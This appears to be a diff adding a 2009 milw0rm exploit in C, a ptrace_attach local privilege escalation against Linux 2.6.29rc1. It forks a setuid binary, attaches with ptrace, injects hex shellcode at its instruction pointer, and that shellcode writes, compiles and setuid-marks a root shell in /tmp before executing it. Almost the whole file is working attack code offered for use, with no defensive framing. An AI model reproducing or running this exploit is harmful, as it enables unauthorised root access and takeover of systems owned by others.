@@ -1,0 +1,91 @@
+/*
+ptrace_attach privilege escalation exploit by s0m3b0dy
+
+[*] tested on Gentoo 2.6.29rc1
+
+grataz:
+Tazo, rassta, nukedclx, maciek, D0hannuk, mivus, wacky, nejmo, filo...
+
+email: s0m3b0dy1 (at) gmail.com
+*/
+
+#include <grp.h>
+#include <stdio.h>
+#include <fcntl.h>
+#include <errno.h>
+#include <paths.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <unistd.h>
+#include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/param.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <sys/socket.h>
+char shellcode[] =
+"\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99" 
+"\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
+"\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff"
+"echo \"#include <stdio.h>\nmain(){setuid(0);if(getuid()==0) printf(\\\"r00teed!\\n\\\");execv(\\\"/bin/bash\\\",0);return 0;}\" > /tmp/.exp.c;gcc /tmp/.exp.c -o /tmp/.exp;rm /tmp/.exp.c;chmod +s /tmp/.exp;exit;";
+struct user_regs_struct322 {
+        unsigned long ebx, ecx, edx, esi, edi, ebp, eax;
+        unsigned short ds, __ds, es, __es;
+        unsigned short fs, __fs, gs, __gs;
+        unsigned long orig_eax, eip;
+        unsigned short cs, __cs;
+        unsigned long eflags, esp;
+        unsigned short ss, __ss;
+};
+
+main()
+{
+struct user_regs_struct322  regs;
+struct stat buf;
+int i,o;
+unsigned long * src;
+unsigned long * dst;
+char *env[2];
+env[0]="/usr/bin/gpasswd";  // some suid file
+env[1]=0;
+if((o=fork()) == 0)
+{
+execve(env[0],env,0);
+exit(0);
+}
+if(ptrace(PTRACE_ATTACH,o,0,0)==-1)
+{
+printf("\n[-] Attach\n");
+exit(0);
+}
+ wait((int *)0);
+if (ptrace(PTRACE_GETREGS, o, NULL, &regs) == -1){
+                printf("\n[-] read registers\n");
+		exit(0);
+}
+printf( "[+] EIP - 0x%08lx\n", regs.eip);
+dst= (unsigned long *) regs.eip;
+src = (unsigned long *) shellcode;
+for(i=0;i<sizeof(shellcode) -1;i+=4)
+if (ptrace(PTRACE_POKETEXT, o, dst++, *src++) == -1){
+                       printf("\n[-] write shellcode\n");
+			exit(0);
+}
+ptrace(PTRACE_CONT, o, 0, 0);
+ptrace(PTRACE_DETACH,o,0,0);
+printf("[+] Waiting for root...\n");
+sleep(2);
+if(!stat("/tmp/.exp",&buf))
+{
+printf("[+] Executing suid shell /tmp/.exp...\n"); 
+execv("/tmp/.exp",0);
+}
+else
+{
+printf("[-] Damn no r00t here :(\n");
+}
+return 0;
+}
+
+// milw0rm.com [2009-05-13]
